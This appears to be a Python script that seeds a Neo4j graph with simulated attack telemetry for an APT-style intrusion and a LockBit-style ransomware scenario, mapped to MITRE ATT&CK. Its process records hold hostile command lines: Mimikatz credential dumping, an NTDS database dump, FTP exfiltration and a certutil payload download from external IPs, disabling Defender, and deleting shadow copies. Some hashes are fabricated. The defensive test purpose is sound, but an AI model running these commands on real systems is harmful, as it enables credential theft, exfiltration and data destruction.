"""
Seed Neo4j with realistic cyber attack test data.

Based on MITRE ATT&CK framework + Cyber Kill Chain.
Includes two complete attack scenarios:

  Scenario A — APT29 style spear-phishing → lateral movement → data exfiltration
  Scenario B — Ransomware (LockBit style) via RDP brute-force → privilege escalation → encryption

Run:
    source venv/bin/activate
    python tests/seed_data.py
"""

from neo4j import GraphDatabase

URI = "bolt://localhost:7687"
USER = "neo4j"
PASSWORD = "password"


def run(tx, cypher, **params):
    tx.run(cypher, **params)


def seed(session):
    # ================================================================
    # 0. CLEAN SLATE
    # ================================================================
    session.run("MATCH (n) DETACH DELETE n")
    print("🗑️  Cleared existing data.")

    # ================================================================
    # 1. CONSTRAINTS & INDEXES
    # ================================================================
    for label in ["Host", "User", "Process", "Alert", "IOC", "Network_Connection",
                  "File", "Email", "Vulnerability", "MITRE_Technique"]:
        try:
            session.run(f"CREATE CONSTRAINT IF NOT EXISTS FOR (n:{label}) REQUIRE n.id IS UNIQUE")
        except Exception:
            pass
    print("📐 Constraints created.")

    # ================================================================
    # 2. HOSTS — corporate network
    # ================================================================
    hosts = [
        # ── Servers ──
        {"id": "DC01", "name": "DC01", "ip": "10.10.1.1", "os": "Windows Server 2019",
         "role": "Domain Controller", "department": "IT", "criticality": "critical"},
        {"id": "FS01", "name": "FS01", "ip": "10.10.1.10", "os": "Windows Server 2019",
         "role": "File Server", "department": "IT", "criticality": "high"},
        {"id": "MAIL01", "name": "MAIL01", "ip": "10.10.1.20", "os": "Windows Server 2022",
         "role": "Exchange Server", "department": "IT", "criticality": "high"},
        {"id": "WEB01", "name": "WEB01", "ip": "10.10.2.100", "os": "Ubuntu 22.04",
         "role": "Web Server", "department": "Engineering", "criticality": "medium"},
        {"id": "DB01", "name": "DB01", "ip": "10.10.2.101", "os": "Ubuntu 22.04",
         "role": "Database Server", "department": "Engineering", "criticality": "critical"},
        # ── Workstations ──
        {"id": "WKS01", "name": "WKS01", "ip": "10.10.3.50", "os": "Windows 11",
         "role": "Workstation", "department": "Finance", "criticality": "medium"},
        {"id": "WKS02", "name": "WKS02", "ip": "10.10.3.51", "os": "Windows 11",
         "role": "Workstation", "department": "HR", "criticality": "medium"},
        {"id": "WKS03", "name": "WKS03", "ip": "10.10.3.52", "os": "Windows 11",
         "role": "Workstation", "department": "Engineering", "criticality": "low"},
        {"id": "WKS04", "name": "WKS04", "ip": "10.10.3.53", "os": "macOS Sonoma",
         "role": "Workstation", "department": "Executive", "criticality": "high"},
        {"id": "WKS05", "name": "WKS05", "ip": "10.10.3.54", "os": "Windows 11",
         "role": "Workstation", "department": "Finance", "criticality": "medium"},
    ]
    for h in hosts:
        session.run(
            "CREATE (h:Host {id: $id, name: $name, ip: $ip, os: $os, "
            "role: $role, department: $department, criticality: $criticality})",
            **h,
        )
    print(f"🖥️  Created {len(hosts)} hosts.")

    # ================================================================
    # 3. USERS
    # ================================================================
    users = [
        {"id": "u_jchen", "username": "jchen", "full_name": "James Chen", "department": "Finance",
         "role": "Financial Analyst", "privilege_level": "standard", "email": "jchen@acme.com"},
        {"id": "u_mwang", "username": "mwang", "full_name": "Maria Wang", "department": "HR",
         "role": "HR Manager", "privilege_level": "standard", "email": "mwang@acme.com"},
        {"id": "u_asmith", "username": "asmith", "full_name": "Alex Smith", "department": "Engineering",
         "role": "Developer", "privilege_level": "standard", "email": "asmith@acme.com"},
        {"id": "u_admin", "username": "admin", "full_name": "System Admin", "department": "IT",
         "role": "Domain Admin", "privilege_level": "admin", "email": "admin@acme.com"},
        {"id": "u_svc_backup", "username": "svc_backup", "full_name": "Backup Service",
         "department": "IT", "role": "Service Account", "privilege_level": "admin",
         "email": "svc_backup@acme.com"},
        {"id": "u_lzhang", "username": "lzhang", "full_name": "Lisa Zhang", "department": "Executive",
         "role": "CFO", "privilege_level": "standard", "email": "lzhang@acme.com"},
    ]
    for u in users:
        session.run(
            "CREATE (u:User {id: $id, username: $username, full_name: $full_name, "
            "department: $department, role: $role, privilege_level: $privilege_level, email: $email})",
            **u,
        )
    print(f"👤 Created {len(users)} users.")

    # ── User → Host (USES) ──
    user_host = [
        ("u_jchen", "WKS01"), ("u_mwang", "WKS02"), ("u_asmith", "WKS03"),
        ("u_lzhang", "WKS04"), ("u_admin", "DC01"), ("u_svc_backup", "FS01"),
        ("u_jchen", "WKS05"),
    ]
    for uid, hid in user_host:
        session.run(
            "MATCH (u:User {id: $uid}), (h:Host {id: $hid}) "
            "CREATE (u)-[:USES {since: '2024-01-15'}]->(h)",
            uid=uid, hid=hid,
        )

    # ================================================================
    # 4. MITRE ATT&CK TECHNIQUES
    # ================================================================
    techniques = [
        {"id": "T1566.001", "name": "Spear Phishing Attachment", "tactic": "Initial Access"},
        {"id": "T1059.001", "name": "PowerShell", "tactic": "Execution"},
        {"id": "T1059.003", "name": "Windows Command Shell", "tactic": "Execution"},
        {"id": "T1547.001", "name": "Registry Run Keys", "tactic": "Persistence"},
        {"id": "T1003.001", "name": "LSASS Memory Dump", "tactic": "Credential Access"},
        {"id": "T1021.001", "name": "Remote Desktop Protocol", "tactic": "Lateral Movement"},
        {"id": "T1021.002", "name": "SMB/Admin Shares", "tactic": "Lateral Movement"},
        {"id": "T1078", "name": "Valid Accounts", "tactic": "Defense Evasion"},
        {"id": "T1486", "name": "Data Encrypted for Impact", "tactic": "Impact"},
        {"id": "T1048.003", "name": "Exfiltration Over Unencrypted Non-C2", "tactic": "Exfiltration"},
        {"id": "T1071.001", "name": "Web Protocols (C2)", "tactic": "Command and Control"},
        {"id": "T1110.001", "name": "Password Guessing", "tactic": "Credential Access"},
        {"id": "T1082", "name": "System Information Discovery", "tactic": "Discovery"},
        {"id": "T1069.002", "name": "Domain Groups Discovery", "tactic": "Discovery"},
        {"id": "T1018", "name": "Remote System Discovery", "tactic": "Discovery"},
        {"id": "T1490", "name": "Inhibit System Recovery", "tactic": "Impact"},
    ]
    for t in techniques:
        session.run(
            "CREATE (t:MITRE_Technique {id: $id, name: $name, tactic: $tactic})",
            **t,
        )
    print(f"🎯 Created {len(techniques)} MITRE ATT&CK techniques.")

    # ================================================================
    # 5. VULNERABILITIES
    # ================================================================
    vulns = [
        {"id": "CVE-2024-21413", "name": "Microsoft Outlook RCE", "severity": "critical",
         "cvss": 9.8, "affected_product": "Microsoft Outlook"},
        {"id": "CVE-2024-3400", "name": "Palo Alto PAN-OS Command Injection", "severity": "critical",
         "cvss": 10.0, "affected_product": "Palo Alto PAN-OS"},
        {"id": "CVE-2023-44228", "name": "Apache Struts RCE", "severity": "high",
         "cvss": 8.1, "affected_product": "Apache Struts"},
    ]
    for v in vulns:
        session.run(
            "CREATE (v:Vulnerability {id: $id, name: $name, severity: $severity, "
            "cvss: $cvss, affected_product: $affected_product})",
            **v,
        )
    session.run(
        "MATCH (h:Host {id: 'MAIL01'}), (v:Vulnerability {id: 'CVE-2024-21413'}) "
        "CREATE (h)-[:HAS_VULNERABILITY {discovered: '2024-10-01'}]->(v)"
    )
    session.run(
        "MATCH (h:Host {id: 'WEB01'}), (v:Vulnerability {id: 'CVE-2023-44228'}) "
        "CREATE (h)-[:HAS_VULNERABILITY {discovered: '2024-09-15'}]->(v)"
    )

    # ================================================================
    # 6. IOCs
    # ================================================================
    iocs = [
        # ── Scenario A: APT ──
        {"id": "ioc_c2_1", "type": "ip", "value": "185.220.101.34",
         "description": "C2 server (Cobalt Strike)", "threat_actor": "APT29", "first_seen": "2024-11-15"},
        {"id": "ioc_c2_domain", "type": "domain", "value": "update-service.cloud-cdn.net",
         "description": "C2 domain fronting", "threat_actor": "APT29", "first_seen": "2024-11-15"},
        {"id": "ioc_hash_1", "type": "sha256",
         "value": "a3b8d1c9e2f4571b0c9e8d7a6f5b4e3c2d1a0f9e8b7c6d5e4f3a2b1c0d9e8f7",
         "description": "Cobalt Strike beacon (invoice.pdf.exe)", "threat_actor": "APT29",
         "first_seen": "2024-11-15"},
        {"id": "ioc_hash_2", "type": "sha256",
         "value": "f7e6d5c4b3a2019f8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c3b2a1f0e9d8c7b6a5",
         "description": "Mimikatz variant", "threat_actor": "APT29", "first_seen": "2024-11-15"},
        {"id": "ioc_email_sender", "type": "email", "value": "hr-benefits@acme-corp.co",
         "description": "Phishing sender (typo-squatting)", "threat_actor": "APT29",
         "first_seen": "2024-11-15"},
        {"id": "ioc_exfil_ip", "type": "ip", "value": "91.234.99.12",
         "description": "Data exfiltration endpoint (FTP)", "threat_actor": "APT29",
         "first_seen": "2024-11-16"},
        # ── Scenario B: Ransomware ──
        {"id": "ioc_rdp_scanner", "type": "ip", "value": "45.134.26.77",
         "description": "RDP brute-force scanner", "threat_actor": "LockBit", "first_seen": "2024-12-01"},
        {"id": "ioc_ransom_hash", "type": "sha256",
         "value": "1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2",
         "description": "LockBit 3.0 encryptor", "threat_actor": "LockBit",
         "first_seen": "2024-12-02"},
        {"id": "ioc_lockbit_c2", "type": "domain", "value": "lockbit-decryptor.onion",
         "description": "LockBit payment portal", "threat_actor": "LockBit", "first_seen": "2024-12-02"},
    ]
    for i in iocs:
        session.run(
            "CREATE (i:IOC {id: $id, type: $type, value: $value, description: $description, "
            "threat_actor: $threat_actor, first_seen: $first_seen})",
            **i,
        )
    print(f"🚨 Created {len(iocs)} IOCs.")

    # ================================================================
    # 7. EMAILS (phishing)
    # ================================================================
    session.run("""
        CREATE (e:Email {
            id: 'email_phish_01',
            subject: 'Q4 Benefits Update - Action Required',
            sender: 'hr-benefits@acme-corp.co',
            recipient: 'jchen@acme.com',
            timestamp: '2024-11-15T08:32:00Z',
            has_attachment: true,
            attachment_name: 'Q4_Benefits_Update.pdf.exe',
            attachment_hash: 'a3b8d1c9e2f4571b0c9e8d7a6f5b4e3c2d1a0f9e8b7c6d5e4f3a2b1c0d9e8f7',
            is_malicious: true
        })
    """)
    session.run("""
        MATCH (e:Email {id: 'email_phish_01'}), (u:User {id: 'u_jchen'})
        CREATE (e)-[:DELIVERED_TO {timestamp: '2024-11-15T08:32:00Z'}]->(u)
    """)
    session.run("""
        MATCH (e:Email {id: 'email_phish_01'}), (i:IOC {id: 'ioc_email_sender'})
        CREATE (e)-[:SENT_FROM]->(i)
    """)

    # ================================================================
    # 8. SCENARIO A — APT29 Attack Chain
    #    Time: 2024-11-15 08:30 → 2024-11-16 03:00
    # ================================================================
    print("\n⚔️  Scenario A: APT29 Spear-Phishing Campaign")

    # ── Phase 1: Initial Access — user opens phishing attachment ──
    procs_a = [
        {"id": "proc_outlook_jchen", "name": "outlook.exe", "pid": 4120,
         "host_id": "WKS01", "user_id": "u_jchen",
         "cmd": "outlook.exe", "timestamp": "2024-11-15T08:30:00Z"},
        {"id": "proc_payload_01", "name": "Q4_Benefits_Update.pdf.exe", "pid": 7744,
         "host_id": "WKS01", "user_id": "u_jchen",
         "cmd": "Q4_Benefits_Update.pdf.exe", "timestamp": "2024-11-15T08:45:12Z"},
        {"id": "proc_powershell_01", "name": "powershell.exe", "pid": 8812,
         "host_id": "WKS01", "user_id": "u_jchen",
         "cmd": "powershell.exe -nop -w hidden -enc UwB0AGEAcgB0AC0A...",
         "timestamp": "2024-11-15T08:45:18Z"},
        # ── Phase 2: C2 beacon ──
        {"id": "proc_beacon_01", "name": "svchost.exe", "pid": 9200,
         "host_id": "WKS01", "user_id": "u_jchen",
         "cmd": "C:\\Windows\\Temp\\svchost.exe (injected Cobalt Strike beacon)",
         "timestamp": "2024-11-15T08:46:00Z"},
        # ── Phase 3: Discovery ──
        {"id": "proc_whoami", "name": "whoami.exe", "pid": 9300,
         "host_id": "WKS01", "user_id": "u_jchen",
         "cmd": "whoami /all", "timestamp": "2024-11-15T09:10:00Z"},
        {"id": "proc_net_group", "name": "net.exe", "pid": 9310,
         "host_id": "WKS01", "user_id": "u_jchen",
         "cmd": "net group \"Domain Admins\" /domain", "timestamp": "2024-11-15T09:12:00Z"},
        {"id": "proc_nltest", "name": "nltest.exe", "pid": 9320,
         "host_id": "WKS01", "user_id": "u_jchen",
         "cmd": "nltest /dclist:acme.local", "timestamp": "2024-11-15T09:15:00Z"},
        # ── Phase 4: Credential Access (Mimikatz) ──
        {"id": "proc_mimikatz", "name": "m64.exe", "pid": 10200,
         "host_id": "WKS01", "user_id": "u_jchen",
         "cmd": "m64.exe sekurlsa::logonpasswords", "timestamp": "2024-11-15T10:30:00Z"},
        # ── Phase 5: Lateral Movement to DC ──
        {"id": "proc_psexec_dc", "name": "psexec.exe", "pid": 11000,
         "host_id": "DC01", "user_id": "u_admin",
         "cmd": "psexec.exe \\\\DC01 -u admin -p *** cmd.exe",
         "timestamp": "2024-11-15T11:05:00Z"},
        {"id": "proc_ntds_dump", "name": "ntdsutil.exe", "pid": 11500,
         "host_id": "DC01", "user_id": "u_admin",
         "cmd": "ntdsutil.exe \"ac i ntds\" \"ifm\" \"create full c:\\temp\\ntds\"",
         "timestamp": "2024-11-15T11:30:00Z"},
        # ── Phase 6: Lateral Movement to File Server ──
        {"id": "proc_smb_fs", "name": "explorer.exe", "pid": 12000,
         "host_id": "FS01", "user_id": "u_admin",
         "cmd": "net use \\\\FS01\\C$ /user:admin", "timestamp": "2024-11-15T14:00:00Z"},
        # ── Phase 7: Data Staging & Exfiltration ──
        {"id": "proc_7zip", "name": "7z.exe", "pid": 12100,
         "host_id": "FS01", "user_id": "u_admin",
         "cmd": "7z.exe a C:\\temp\\archive.7z C:\\shares\\finance\\*",
         "timestamp": "2024-11-16T01:00:00Z"},
        {"id": "proc_ftp_exfil", "name": "ftp.exe", "pid": 12200,
         "host_id": "FS01", "user_id": "u_admin",
         "cmd": "ftp.exe -s:script.txt 91.234.99.12", "timestamp": "2024-11-16T02:30:00Z"},
    ]
    for p in procs_a:
        session.run(
            "CREATE (p:Process {id: $id, name: $name, pid: $pid, "
            "cmd: $cmd, timestamp: $timestamp})",
            **{k: v for k, v in p.items() if k not in ("host_id", "user_id")},
        )
        session.run(
            "MATCH (p:Process {id: $pid}), (h:Host {id: $hid}) "
            "CREATE (p)-[:RUNS_ON]->(h)",
            pid=p["id"], hid=p["host_id"],
        )
        session.run(
            "MATCH (p:Process {id: $pid}), (u:User {id: $uid}) "
            "CREATE (u)-[:EXECUTED {timestamp: $ts}]->(p)",
            pid=p["id"], uid=p["user_id"], ts=p["timestamp"],
        )

    # Process parent relationships (spawn chain)
    spawns_a = [
        ("proc_outlook_jchen", "proc_payload_01", "2024-11-15T08:45:12Z"),
        ("proc_payload_01", "proc_powershell_01", "2024-11-15T08:45:18Z"),
        ("proc_powershell_01", "proc_beacon_01", "2024-11-15T08:46:00Z"),
        ("proc_beacon_01", "proc_whoami", "2024-11-15T09:10:00Z"),
        ("proc_beacon_01", "proc_net_group", "2024-11-15T09:12:00Z"),
        ("proc_beacon_01", "proc_nltest", "2024-11-15T09:15:00Z"),
        ("proc_beacon_01", "proc_mimikatz", "2024-11-15T10:30:00Z"),
        ("proc_mimikatz", "proc_psexec_dc", "2024-11-15T11:05:00Z"),
        ("proc_psexec_dc", "proc_ntds_dump", "2024-11-15T11:30:00Z"),
        ("proc_psexec_dc", "proc_smb_fs", "2024-11-15T14:00:00Z"),
        ("proc_smb_fs", "proc_7zip", "2024-11-16T01:00:00Z"),
        ("proc_7zip", "proc_ftp_exfil", "2024-11-16T02:30:00Z"),
    ]
    for parent, child, ts in spawns_a:
        session.run(
            "MATCH (p:Process {id: $parent}), (c:Process {id: $child}) "
            "CREATE (p)-[:SPAWNED {timestamp: $ts}]->(c)",
            parent=parent, child=child, ts=ts,
        )

    # ── Network connections ──
    net_conns_a = [
        {"id": "nc_c2_beacon", "src_ip": "10.10.3.50", "dst_ip": "185.220.101.34",
         "dst_port": 443, "protocol": "HTTPS", "bytes_sent": 1200, "bytes_recv": 45000,
         "timestamp": "2024-11-15T08:46:05Z", "description": "Cobalt Strike beacon check-in",
         "src_host": "WKS01", "process_id": "proc_beacon_01"},
        {"id": "nc_c2_periodic", "src_ip": "10.10.3.50", "dst_ip": "185.220.101.34",
         "dst_port": 443, "protocol": "HTTPS", "bytes_sent": 500, "bytes_recv": 12000,
         "timestamp": "2024-11-15T10:00:00Z", "description": "C2 heartbeat",
         "src_host": "WKS01", "process_id": "proc_beacon_01"},
        {"id": "nc_psexec_dc", "src_ip": "10.10.3.50", "dst_ip": "10.10.1.1",
         "dst_port": 445, "protocol": "SMB", "bytes_sent": 8500, "bytes_recv": 3200,
         "timestamp": "2024-11-15T11:04:00Z", "description": "PsExec to Domain Controller",
         "src_host": "WKS01", "process_id": "proc_psexec_dc"},
        {"id": "nc_smb_fs", "src_ip": "10.10.1.1", "dst_ip": "10.10.1.10",
         "dst_port": 445, "protocol": "SMB", "bytes_sent": 1500, "bytes_recv": 890000,
         "timestamp": "2024-11-15T14:01:00Z", "description": "Admin share access to File Server",
         "src_host": "DC01", "process_id": "proc_smb_fs"},
        {"id": "nc_ftp_exfil", "src_ip": "10.10.1.10", "dst_ip": "91.234.99.12",
         "dst_port": 21, "protocol": "FTP", "bytes_sent": 524288000, "bytes_recv": 1200,
         "timestamp": "2024-11-16T02:30:00Z", "description": "Data exfiltration (500 MB)",
         "src_host": "FS01", "process_id": "proc_ftp_exfil"},
    ]
    for nc in net_conns_a:
        session.run(
            "CREATE (nc:Network_Connection {id: $id, src_ip: $src_ip, dst_ip: $dst_ip, "
            "dst_port: $dst_port, protocol: $protocol, bytes_sent: $bytes_sent, "
            "bytes_recv: $bytes_recv, timestamp: $timestamp, description: $description})",
            **{k: v for k, v in nc.items() if k not in ("src_host", "process_id")},
        )
        session.run(
            "MATCH (nc:Network_Connection {id: $ncid}), (h:Host {id: $hid}) "
            "CREATE (h)-[:INITIATED]->(nc)",
            ncid=nc["id"], hid=nc["src_host"],
        )
        session.run(
            "MATCH (nc:Network_Connection {id: $ncid}), (p:Process {id: $pid}) "
            "CREATE (p)-[:ESTABLISHED]->(nc)",
            ncid=nc["id"], pid=nc["process_id"],
        )
    # Connect IOCs to network connections
    session.run("""
        MATCH (nc:Network_Connection {dst_ip: '185.220.101.34'}), (ioc:IOC {id: 'ioc_c2_1'})
        CREATE (nc)-[:CONNECTS_TO]->(ioc)
    """)
    session.run("""
        MATCH (nc:Network_Connection {dst_ip: '91.234.99.12'}), (ioc:IOC {id: 'ioc_exfil_ip'})
        CREATE (nc)-[:CONNECTS_TO]->(ioc)
    """)
    # Connect payload to IOC hash
    session.run("""
        MATCH (p:Process {id: 'proc_payload_01'}), (ioc:IOC {id: 'ioc_hash_1'})
        CREATE (p)-[:MATCHES_IOC]->(ioc)
    """)
    session.run("""
        MATCH (p:Process {id: 'proc_mimikatz'}), (ioc:IOC {id: 'ioc_hash_2'})
        CREATE (p)-[:MATCHES_IOC]->(ioc)
    """)

    # ── Files ──
    files_a = [
        {"id": "file_payload", "name": "Q4_Benefits_Update.pdf.exe", "path": "C:\\Users\\jchen\\Downloads",
         "hash": "a3b8d1c9e2f4571b0c9e8d7a6f5b4e3c2d1a0f9e8b7c6d5e4f3a2b1c0d9e8f7",
         "size_bytes": 284672, "created": "2024-11-15T08:45:10Z", "host_id": "WKS01"},
        {"id": "file_beacon", "name": "svchost.exe", "path": "C:\\Windows\\Temp",
         "hash": "b4c9e2d0f3a5682c1daf9e8b7d6c5f4e3b2a1c0f9e8d7b6a5f4e3d2c1b0a9e8",
         "size_bytes": 312320, "created": "2024-11-15T08:45:55Z", "host_id": "WKS01"},
        {"id": "file_mimikatz", "name": "m64.exe", "path": "C:\\Users\\jchen\\AppData\\Local\\Temp",
         "hash": "f7e6d5c4b3a2019f8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c3b2a1f0e9d8c7b6a5",
         "size_bytes": 1247232, "created": "2024-11-15T10:29:00Z", "host_id": "WKS01"},
        {"id": "file_ntds", "name": "ntds.dit", "path": "C:\\temp\\ntds",
         "hash": "c5d0a3e1f4b2693d2ebf0a9c8e7d6g5h4i3j2k1l0m9n8o7p6q5r4s3t2u1v0w9",
         "size_bytes": 67108864, "created": "2024-11-15T11:35:00Z", "host_id": "DC01"},
        {"id": "file_archive", "name": "archive.7z", "path": "C:\\temp",
         "hash": "d6e1b4f2a5c3704e3fcg1b0d9f8e7h6g5i4j3k2l1m0n9o8p7q6r5s4t3u2v1w0",
         "size_bytes": 524288000, "created": "2024-11-16T01:45:00Z", "host_id": "FS01"},
    ]
    for f in files_a:
        session.run(
            "CREATE (f:File {id: $id, name: $name, path: $path, hash: $hash, "
            "size_bytes: $size_bytes, created: $created})",
            **{k: v for k, v in f.items() if k != "host_id"},
        )
        session.run(
            "MATCH (f:File {id: $fid}), (h:Host {id: $hid}) "
            "CREATE (f)-[:LOCATED_ON]->(h)",
            fid=f["id"], hid=f["host_id"],
        )

    # ── Alerts (Scenario A) ──
    alerts_a = [
        {"id": "alert_phish_01", "name": "Suspicious Email Attachment Executed",
         "severity": "high", "source": "EDR",
         "description": "User jchen executed a .pdf.exe file from Outlook",
         "timestamp": "2024-11-15T08:45:15Z", "status": "open",
         "host_id": "WKS01", "technique_id": "T1566.001"},
        {"id": "alert_ps_enc", "name": "Encoded PowerShell Execution",
         "severity": "critical", "source": "EDR",
         "description": "Encoded PowerShell command launched by suspicious executable",
         "timestamp": "2024-11-15T08:45:20Z", "status": "open",
         "host_id": "WKS01", "technique_id": "T1059.001"},
        {"id": "alert_c2", "name": "Suspicious Outbound HTTPS to Known Threat IP",
         "severity": "critical", "source": "NDR",
         "description": "Connection to 185.220.101.34:443 — known Cobalt Strike C2",
         "timestamp": "2024-11-15T08:46:10Z", "status": "open",
         "host_id": "WKS01", "technique_id": "T1071.001"},
        {"id": "alert_discovery", "name": "Reconnaissance Command Sequence",
         "severity": "medium", "source": "EDR",
         "description": "whoami, net group, nltest executed in sequence",
         "timestamp": "2024-11-15T09:16:00Z", "status": "open",
         "host_id": "WKS01", "technique_id": "T1069.002"},
        {"id": "alert_cred_dump", "name": "LSASS Memory Access Detected",
         "severity": "critical", "source": "EDR",
         "description": "Process m64.exe accessed LSASS memory — credential dumping",
         "timestamp": "2024-11-15T10:30:05Z", "status": "open",
         "host_id": "WKS01", "technique_id": "T1003.001"},
        {"id": "alert_lat_mov_dc", "name": "Lateral Movement — PsExec to Domain Controller",
         "severity": "critical", "source": "EDR",
         "description": "PsExec used to execute code on DC01 from WKS01",
         "timestamp": "2024-11-15T11:05:05Z", "status": "open",
         "host_id": "DC01", "technique_id": "T1021.002"},
        {"id": "alert_ntds", "name": "NTDS.dit Access Detected",
         "severity": "critical", "source": "EDR",
         "description": "ntdsutil created IFM of Active Directory database",
         "timestamp": "2024-11-15T11:30:30Z", "status": "open",
         "host_id": "DC01", "technique_id": "T1003.001"},
        {"id": "alert_exfil", "name": "Large Outbound FTP Transfer to External IP",
         "severity": "critical", "source": "NDR",
         "description": "500 MB transferred via FTP to 91.234.99.12 at 02:30 AM",
         "timestamp": "2024-11-16T02:35:00Z", "status": "open",
         "host_id": "FS01", "technique_id": "T1048.003"},
    ]
    for a in alerts_a:
        session.run(
            "CREATE (a:Alert {id: $id, name: $name, severity: $severity, source: $source, "
            "description: $description, timestamp: $timestamp, status: $status})",
            **{k: v for k, v in a.items() if k not in ("host_id", "technique_id")},
        )
        session.run(
            "MATCH (a:Alert {id: $aid}), (h:Host {id: $hid}) "
            "CREATE (h)-[:TRIGGERED {timestamp: $ts}]->(a)",
            aid=a["id"], hid=a["host_id"], ts=a["timestamp"],
        )
        session.run(
            "MATCH (a:Alert {id: $aid}), (t:MITRE_Technique {id: $tid}) "
            "CREATE (a)-[:MAPS_TO]->(t)",
            aid=a["id"], tid=a["technique_id"],
        )
    print(f"   📌 Created {len(alerts_a)} alerts for Scenario A.")

    # ================================================================
    # 9. SCENARIO B — LockBit Ransomware
    #    Time: 2024-12-01 → 2024-12-02
    # ================================================================
    print("\n⚔️  Scenario B: LockBit Ransomware via RDP Brute-Force")

    procs_b = [
        # Phase 1: RDP brute-force (external)
        {"id": "proc_rdp_brute", "name": "hydra", "pid": 0,
         "host_id": "WEB01", "user_id": "u_asmith",
         "cmd": "External RDP brute-force from 45.134.26.77",
         "timestamp": "2024-12-01T03:00:00Z"},
        # Phase 2: RDP logon success
        {"id": "proc_rdp_session", "name": "rdpclip.exe", "pid": 6700,
         "host_id": "WEB01", "user_id": "u_asmith",
         "cmd": "RDP session established from 45.134.26.77",
         "timestamp": "2024-12-01T04:12:00Z"},
        # Phase 3: Disable AV
        {"id": "proc_disable_av", "name": "powershell.exe", "pid": 7100,
         "host_id": "WEB01", "user_id": "u_asmith",
         "cmd": "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true",
         "timestamp": "2024-12-01T04:15:00Z"},
        # Phase 4: Download ransomware
        {"id": "proc_certutil", "name": "certutil.exe", "pid": 7200,
         "host_id": "WEB01", "user_id": "u_asmith",
         "cmd": "certutil.exe -urlcache -split -f http://45.134.26.77/lb3.exe C:\\temp\\lb3.exe",
         "timestamp": "2024-12-01T04:18:00Z"},
        # Phase 5: Spread to DB server
        {"id": "proc_psexec_db", "name": "psexec.exe", "pid": 7400,
         "host_id": "DB01", "user_id": "u_asmith",
         "cmd": "psexec.exe \\\\DB01 -u asmith cmd /c C:\\temp\\lb3.exe",
         "timestamp": "2024-12-01T04:30:00Z"},
        # Phase 6: Delete shadow copies
        {"id": "proc_vssadmin", "name": "vssadmin.exe", "pid": 7500,
         "host_id": "WEB01", "user_id": "u_asmith",
         "cmd": "vssadmin.exe delete shadows /all /quiet",
         "timestamp": "2024-12-02T00:00:00Z"},
        # Phase 7: Encrypt files
        {"id": "proc_lockbit", "name": "lb3.exe", "pid": 7600,
         "host_id": "WEB01", "user_id": "u_asmith",
         "cmd": "lb3.exe --encrypt-all --note ransom.txt",
         "timestamp": "2024-12-02T00:01:00Z"},
        {"id": "proc_lockbit_db", "name": "lb3.exe", "pid": 7700,
         "host_id": "DB01", "user_id": "u_asmith",
         "cmd": "lb3.exe --encrypt-all --note ransom.txt",
         "timestamp": "2024-12-02T00:05:00Z"},
    ]
    for p in procs_b:
        session.run(
            "CREATE (p:Process {id: $id, name: $name, pid: $pid, "
            "cmd: $cmd, timestamp: $timestamp})",
            **{k: v for k, v in p.items() if k not in ("host_id", "user_id")},
        )
        session.run(
            "MATCH (p:Process {id: $pid}), (h:Host {id: $hid}) "
            "CREATE (p)-[:RUNS_ON]->(h)",
            pid=p["id"], hid=p["host_id"],
        )
        session.run(
            "MATCH (p:Process {id: $pid}), (u:User {id: $uid}) "
            "CREATE (u)-[:EXECUTED {timestamp: $ts}]->(p)",
            pid=p["id"], uid=p["user_id"], ts=p["timestamp"],
        )

    spawns_b = [
        ("proc_rdp_session", "proc_disable_av", "2024-12-01T04:15:00Z"),
        ("proc_rdp_session", "proc_certutil", "2024-12-01T04:18:00Z"),
        ("proc_certutil", "proc_psexec_db", "2024-12-01T04:30:00Z"),
        ("proc_rdp_session", "proc_vssadmin", "2024-12-02T00:00:00Z"),
        ("proc_vssadmin", "proc_lockbit", "2024-12-02T00:01:00Z"),
        ("proc_psexec_db", "proc_lockbit_db", "2024-12-02T00:05:00Z"),
    ]
    for parent, child, ts in spawns_b:
        session.run(
            "MATCH (p:Process {id: $parent}), (c:Process {id: $child}) "
            "CREATE (p)-[:SPAWNED {timestamp: $ts}]->(c)",
            parent=parent, child=child, ts=ts,
        )

    # Network connections for scenario B
    net_conns_b = [
        {"id": "nc_rdp_brute", "src_ip": "45.134.26.77", "dst_ip": "10.10.2.100",
         "dst_port": 3389, "protocol": "RDP", "bytes_sent": 50000, "bytes_recv": 12000,
         "timestamp": "2024-12-01T03:00:00Z", "description": "RDP brute-force (1200 attempts)",
         "src_host": "WEB01", "process_id": "proc_rdp_brute"},
        {"id": "nc_download_lb", "src_ip": "10.10.2.100", "dst_ip": "45.134.26.77",
         "dst_port": 80, "protocol": "HTTP", "bytes_sent": 200, "bytes_recv": 2097152,
         "timestamp": "2024-12-01T04:18:05Z", "description": "Ransomware download (2 MB)",
         "src_host": "WEB01", "process_id": "proc_certutil"},
        {"id": "nc_lat_mov_db", "src_ip": "10.10.2.100", "dst_ip": "10.10.2.101",
         "dst_port": 445, "protocol": "SMB", "bytes_sent": 2097152, "bytes_recv": 500,
         "timestamp": "2024-12-01T04:30:05Z", "description": "PsExec to Database Server",
         "src_host": "WEB01", "process_id": "proc_psexec_db"},
    ]
    for nc in net_conns_b:
        session.run(
            "CREATE (nc:Network_Connection {id: $id, src_ip: $src_ip, dst_ip: $dst_ip, "
            "dst_port: $dst_port, protocol: $protocol, bytes_sent: $bytes_sent, "
            "bytes_recv: $bytes_recv, timestamp: $timestamp, description: $description})",
            **{k: v for k, v in nc.items() if k not in ("src_host", "process_id")},
        )
        session.run(
            "MATCH (nc:Network_Connection {id: $ncid}), (h:Host {id: $hid}) "
            "CREATE (h)-[:INITIATED]->(nc)",
            ncid=nc["id"], hid=nc["src_host"],
        )
        session.run(
            "MATCH (nc:Network_Connection {id: $ncid}), (p:Process {id: $pid}) "
            "CREATE (p)-[:ESTABLISHED]->(nc)",
            ncid=nc["id"], pid=nc["process_id"],
        )
    session.run("""
        MATCH (nc:Network_Connection) WHERE nc.src_ip = '45.134.26.77' OR nc.dst_ip = '45.134.26.77'
        WITH nc
        MATCH (ioc:IOC {id: 'ioc_rdp_scanner'})
        CREATE (nc)-[:CONNECTS_TO]->(ioc)
    """)
    session.run("""
        MATCH (p:Process {id: 'proc_lockbit'}), (ioc:IOC {id: 'ioc_ransom_hash'})
        CREATE (p)-[:MATCHES_IOC]->(ioc)
    """)
    session.run("""
